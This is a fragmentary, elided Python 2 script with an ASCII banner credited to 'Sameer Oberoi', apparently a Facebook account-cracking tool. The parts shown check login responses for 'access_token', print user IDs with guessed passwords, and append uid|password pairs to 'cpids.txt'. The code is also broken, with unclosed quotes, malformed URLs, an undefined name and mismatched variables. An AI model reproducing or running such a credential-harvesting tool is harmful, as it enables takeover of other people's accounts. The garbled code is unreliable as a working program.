...
#Script Edited By @Sameer Oberoi
#Utf-8 python 
...
╚═════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Sameer Oberoi
\033[1;92mFb \033[1;93m: Sameer Oberoi 
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-openhttps://www.facebook.com/profile.php?id=100024329409355 )
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https:/https://youtu.be/2WHh9PInptk/')
        main()
    else:
        print ''
...
#-----------------------------
    ...
    print logo
    print ''
    print '   Welcome Dear: ' + Sameer Khan
    print ''
    print '\033[0m\033[0m'
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;31m[OBEROI -SK] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
